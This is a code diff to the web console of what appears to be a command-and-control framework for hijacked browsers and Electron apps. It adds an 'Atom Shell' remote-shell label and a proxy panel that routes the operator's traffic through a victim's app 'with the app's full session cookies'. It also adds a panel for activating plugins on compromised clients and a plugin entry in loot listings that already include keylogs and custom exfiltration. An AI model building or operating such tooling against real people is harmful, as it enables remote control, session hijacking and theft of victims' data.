@@ -3344,7 +3344,9 @@ function sidecarPopOutShell(beaconId) {
     var popWin = window.open('about:blank', '_blank', 'width=800,height=600,menubar=no,toolbar=no,location=no,status=no');
     if (!popWin) { showToast('Pop-up blocked. Please allow pop-ups for this site.', 'warning'); return; }
 
-    var titleText = 'Sidecar Shell - ' + (_sidecarShellNickname || beaconId);
+    var isAtomShell = (beaconId == lastSelectedElectronId);
+    var shellLabel = isAtomShell ? 'Atom Shell' : 'Sidecar Shell';
+    var titleText = shellLabel + ' - ' + (_sidecarShellNickname || beaconId);
     var transferState = {
         beaconId: beaconId,
         cwd: _sidecarShellCwd,
@@ -3731,7 +3733,7 @@ async function getClientDetails(id, autoRefresh)
                                         <span class="input-group-text bg-dark text-white border-secondary" id="sidecar-shell-prompt" style="font-family:monospace; font-size:13px;">~ $ </span>
                                         <input type="text" class="form-control form-control-sm bg-dark text-white border-secondary" id="sidecar-shell-input" style="font-family:monospace;" placeholder="type a command..." onkeydown="sidecarShellKeyHandler(event, '${id}')">
                                         <button class="btn btn-primary btn-sm" onclick="sidecarShellExec('${id}')">Run</button>
-                                        <button class="btn btn-outline-secondary btn-sm" onclick="sidecarPopOutShell('${id}')" title="Pop out shell into separate window">Pop Out</button>
+                                        <button class="btn btn-outline-light btn-sm" onclick="sidecarPopOutShell('${id}')" title="Pop out shell into separate window">Pop Out</button>
                                     </div>
                                 </div>
                                 ${screenshotPaneHtml}
@@ -3777,8 +3779,13 @@ async function getClientDetails(id, autoRefresh)
 
             // Proxy panel -> tools stack (rendered first, above sidecar; browser-extension only)
             var proxyState = { isActive: false, spoofConfig: {} };
-            if (client.clientType === 'bex-beacon') {
+            if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon') {
                 try { proxyState = await renderProxyPanel(toolsStack, id, client) || proxyState; } catch(e) { console.error('Proxy panel error:', e); }
+            }
+
+            // Plugin panel for atom-beacon clients
+            if (client.clientType === 'atom-beacon') {
+                try { await renderPluginPanel(toolsStack, id, client); } catch(e) { console.error('Plugin panel error:', e); }
             }
 
             // Atom-beacon uses app-style event timeline, not domain view
@@ -4208,6 +4215,30 @@ async function getClientDetails(id, autoRefresh)
             }
             break;
 
+        case 'PLUGIN':
+            if (document.getElementById('pluginEvents').checked == true)
+            {
+                activeEvent = true;
+                var pluginDataReq = await fetch('/api/plugins/eventData/' + eventKey);
+                if (pluginDataReq.ok) {
+                    var pluginDataJson = await pluginDataReq.json();
+                    var pName = pluginDataJson.pluginId || 'unknown';
+                    var pType = pluginDataJson.dataType || '';
+                    cardTitle.innerHTML = "Plugin: " + escapeHTML(pName);
+                    if (pType === '_error') {
+                        cardText.innerHTML = '<span class="text-danger">Plugin Error</span><br>';
+                        cardText.innerHTML += '<pre class="small mt-1 mb-0" style="max-height:120px;overflow:auto">' + escapeHTML(JSON.stringify(pluginDataJson.data, null, 2)) + '</pre>';
+                    } else {
+                        cardText.innerHTML = "Type: <b>" + escapeHTML(pType) + "</b><br>";
+                        cardText.innerHTML += '<pre class="small mt-1 mb-0" style="max-height:120px;overflow:auto">' + escapeHTML(JSON.stringify(pluginDataJson.data, null, 2)) + '</pre>';
+                    }
+                } else {
+                    cardTitle.innerHTML = "Plugin Data";
+                    cardText.innerHTML = "Event ID: " + escapeHTML(eventKey);
+                }
+            }
+            break;
+
         case 'KEYLOG':
             if (document.getElementById('keylogEvents').checked == true)
             {
@@ -4269,6 +4300,7 @@ async function getClientDetails(id, autoRefresh)
 
 async function renderProxyPanel(cardStack, beaconId, client) {
     let panel = document.getElementById('proxy-panel');
+    var isAtom = client && client.clientType === 'atom-beacon';
 
     // Fetch proxy status for this specific beacon
     var statusResp = await fetch('/api/proxy/status?beaconID=' + encodeURIComponent(beaconId));
@@ -4296,13 +4328,17 @@ async function renderProxyPanel(cardStack, beaconId, client) {
     }
 
     var spoofConfig = proxyStatus.spoofConfig || {};
+    var panelTitle = isAtom ? 'App Proxy' : 'Browser Proxy';
+    var panelDesc = isAtom
+        ? "Route your browser traffic through this Electron app. Requests execute with the app's full session cookies and network context."
+        : "Route your browser traffic through this beacon. Requests are fetched from the victim's browser/IP via WebSocket.";
 
     panel.innerHTML = `
         <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
-            <span><b>Browser Proxy</b> ${statusBadge}</span>
+            <span><b>${panelTitle}</b> ${statusBadge}</span>
         </div>
         <div class="card-body p-3">
-            <p class="small text-muted mb-2">Route your browser traffic through this beacon. Requests are fetched from the victim's browser/IP via WebSocket.</p>
+            <p class="small text-muted mb-2">${panelDesc}</p>
             <div class="d-flex gap-2 align-items-center mb-2">
                 ${isActive
                     ? '<button class="btn btn-secondary btn-sm" id="proxy-stop-btn">Stop Proxy</button>'
@@ -4348,6 +4384,199 @@ async function renderProxyPanel(cardStack, beaconId, client) {
     }
 
     return { isActive: isActive, spoofConfig: spoofConfig };
+}
+
+
+async function renderPluginPanel(cardStack, beaconId, client) {
+    var panel = document.getElementById('plugin-panel');
+
+    // Fetch available plugins
+    var pluginsResp = await fetch('/api/plugins');
+    var allPlugins = await pluginsResp.json();
+    if (!allPlugins || allPlugins.length === 0) return;
+
+    // Fetch active plugins for this client
+    var activeResp = await fetch('/api/plugins/client/' + encodeURIComponent(beaconId));
+    var activePlugins = await activeResp.json();
+    var activeMap = {};
+    activePlugins.forEach(function(ap) { activeMap[ap.pluginId] = ap; });
+
+    // Skip full rebuild if panel exists with same active state (prevents clobbering plugin UI tabs)
+    if (panel && panel.getAttribute('data-active-state')) {
+        var currentState = activePlugins.map(function(a) { return a.pluginId; }).sort().join(',');
+        if (panel.getAttribute('data-active-state') === currentState) {
+            // Just update the count badge
+            var badge = panel.querySelector('.plugin-count-badge');
+            if (badge) badge.textContent = activePlugins.length + ' / ' + allPlugins.length;
+            return;
+        }
+    }
+
+    if (!panel) {
+        panel = document.createElement('div');
+        panel.id = 'plugin-panel';
+        panel.className = 'card mb-3 border-secondary';
+        cardStack.appendChild(panel);
+    }
+
+    var activeCount = activePlugins.length;
+    var pluginListHtml = '';
+
+    for (var i = 0; i < allPlugins.length; i++) {
+        var p = allPlugins[i];
+        var isActive = !!activeMap[p.id];
+        var statusBadge = isActive
+            ? '<span class="badge bg-success">Active</span>'
+            : '<span class="badge bg-secondary">Inactive</span>';
+
+        var actionBtn = isActive
+            ? '<button class="btn btn-secondary btn-sm plugin-deactivate-btn" data-plugin-id="' + escapeHTML(p.id) + '">Deactivate</button>'
+            : '<button class="btn btn-primary btn-sm plugin-activate-btn" data-plugin-id="' + escapeHTML(p.id) + '">Activate</button>';
+
+        var targetApps = (p.targetApps || []).map(function(t) { return escapeHTML(t); }).join(', ');
+        var settingsHtml = '';
+        if (p.settings && p.settings.length > 0 && !isActive) {
+            settingsHtml = '<div class="mt-2 plugin-settings-form" data-plugin-id="' + escapeHTML(p.id) + '">';
+            for (var s = 0; s < p.settings.length; s++) {
+                var setting = p.settings[s];
+                var defaultVal = setting.default !== undefined ? setting.default : '';
+                settingsHtml += '<div class="mb-1"><label class="form-label small mb-0">' + escapeHTML(setting.label) + '</label>';
+                settingsHtml += '<input class="form-control form-control-sm" data-setting-key="' + escapeHTML(setting.key) + '" type="' + (setting.type === 'number' ? 'number' : 'text') + '" value="' + escapeHTML(String(defaultVal)) + '"></div>';
+            }
+            settingsHtml += '</div>';
+        }
+
+        pluginListHtml += '<div class="d-flex justify-content-between align-items-start border-bottom border-secondary py-2">' +
+            '<div class="flex-grow-1">' +
+            '<div class="d-flex align-items-center gap-2"><b>' + escapeHTML(p.name) + '</b> ' + statusBadge +
+            ' <span class="text-muted small">v' + escapeHTML(p.version || '?') + '</span></div>' +
+            '<div class="small text-muted">' + escapeHTML(p.description || '') + '</div>' +
+            (targetApps ? '<div class="small text-muted">Targets: ' + targetApps + '</div>' : '') +
+            settingsHtml +
+            '</div>' +
+            '<div class="ms-2">' + actionBtn + '</div>' +
+            '</div>';
+
+        // If active and has UI, add a container for it
+        if (isActive && p.capabilities && p.capabilities.ui) {
+            pluginListHtml += '<div class="plugin-ui-container p-2" id="plugin-ui-' + escapeHTML(p.id) + '"></div>';
+        }
+    }
+
+    // Store active state for skip-rebuild check
+    var activeStateKey = activePlugins.map(function(a) { return a.pluginId; }).sort().join(',');
+    panel.setAttribute('data-active-state', activeStateKey);
+
+    panel.innerHTML =
+        '<div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">' +
+        '<span><b>Atom Plugins</b></span>' +
+        '<span class="badge bg-info plugin-count-badge">' + activeCount + ' / ' + allPlugins.length + '</span>' +
+        '</div>' +
+        '<div class="card-body p-3">' + pluginListHtml + '</div>';
+
+    // Wire up activate buttons
+    var activateBtns = panel.querySelectorAll('.plugin-activate-btn');
+    activateBtns.forEach(function(btn) {
+        btn.onclick = async function() {
+            var pluginId = btn.getAttribute('data-plugin-id');
+            btn.disabled = true;
+            btn.textContent = 'Activating...';
+
+            // Gather settings from form
+            var settings = {};
+            var form = panel.querySelector('.plugin-settings-form[data-plugin-id="' + pluginId + '"]');
+            if (form) {
+                var inputs = form.querySelectorAll('input[data-setting-key]');
+                inputs.forEach(function(input) {
+                    var key = input.getAttribute('data-setting-key');
+                    var val = input.type === 'number' ? Number(input.value) : input.value;
+                    settings[key] = val;
+                });
+            }
+
+            await fetch('/api/plugins/' + pluginId + '/activate', {
+                method: 'POST',
+                body: JSON.stringify({ clientID: beaconId, settings: settings }),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            });
+            showToast('Plugin ' + pluginId + ' activated');
+            getClientDetails(beaconId);
+        };
+    });
+
+    // Wire up deactivate buttons
+    var deactivateBtns = panel.querySelectorAll('.plugin-deactivate-btn');
+    deactivateBtns.forEach(function(btn) {
+        btn.onclick = async function() {
+            var pluginId = btn.getAttribute('data-plugin-id');
+            btn.disabled = true;
+            btn.textContent = 'Deactivating...';
+            await fetch('/api/plugins/' + pluginId + '/deactivate', {
+                method: 'POST',
+                body: JSON.stringify({ clientID: beaconId }),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            });
+            showToast('Plugin ' + pluginId + ' deactivated');
+            getClientDetails(beaconId);
+        };
+    });
+
+    // Load custom UI for active plugins
+    for (var j = 0; j < allPlugins.length; j++) {
+        var ap = allPlugins[j];
+        if (activeMap[ap.id] && ap.capabilities && ap.capabilities.ui) {
+            var container = document.getElementById('plugin-ui-' + ap.id);
+            if (container) {
+                await loadPluginUI(ap.id, container, beaconId);
+            }
+        }
+    }
+}
+
+
+async function loadPluginUI(pluginId, containerEl, clientId) {
+    var resp = await fetch('/api/plugins/' + pluginId + '/ui');
+    if (!resp.ok) return;
+    var uiData = await resp.json();
+
+    var pluginDiv = document.createElement('div');
+    pluginDiv.innerHTML = uiData.html || '';
+    containerEl.appendChild(pluginDiv);
+
+    if (uiData.hasJs) {
+        // Set up global registry so the served script can find its API
+        if (!window.__pluginUIRegistry) window.__pluginUIRegistry = {};
+        window.__pluginUIRegistry[pluginId] = {
+            pluginId: pluginId,
+            clientId: clientId,
+            container: pluginDiv,
+            fetchData: function(dataType, limit, offset) {
+                var url = '/api/plugins/' + pluginId + '/data/' + encodeURIComponent(clientId) + '?limit=' + (limit || 100) + '&offset=' + (offset || 0);
+                if (dataType) url += '&dataType=' + encodeURIComponent(dataType);
+                return fetch(url).then(function(r) { return r.json(); });
+            },
+            deleteData: function() {
+                return fetch('/api/plugins/' + pluginId + '/data/' + encodeURIComponent(clientId), { method: 'DELETE' }).then(function(r) { return r.json(); });
+            }
+        };
+
+        // Load plugin JS as a real script (CSP-compliant, no eval)
+        return new Promise(function(resolve) {
+            var script = document.createElement('script');
+            script.src = '/api/plugins/' + pluginId + '/ui.js?t=' + Date.now();
+            script.onload = function() {
+                // Clean up: remove old scripts for this plugin to avoid duplicates on refresh
+                script.remove();
+                resolve();
+            };
+            script.onerror = function() {
+                console.error('Failed to load plugin UI script for ' + pluginId);
+                script.remove();
+                resolve();
+            };
+            document.head.appendChild(script);
+        });
+    }
 }
 
 
@@ -5099,6 +5328,7 @@ var _lootSearchBadgeColors = {
 	'XHRAPICALL': 'dark',
 	'FETCHAPICALL': 'dark',
 	'CUSTOMEXFIL': 'light',
+	'PLUGIN': 'info',
 	'KEYLOG': 'warning',
 	'BEACON_CAPTURE': 'success',
 	'BEACON_VISIT': 'primary'
@@ -5114,6 +5344,7 @@ var _lootSearchTypeLabels = {
 	'XHRAPICALL': 'XHR',
 	'FETCHAPICALL': 'Fetch',
 	'CUSTOMEXFIL': 'Custom Exfil',
+	'PLUGIN': 'Plugin',
 	'KEYLOG': 'Keylog',
 	'BEACON_CAPTURE': 'Beacon Capture',
 	'BEACON_VISIT': 'Beacon Visit'
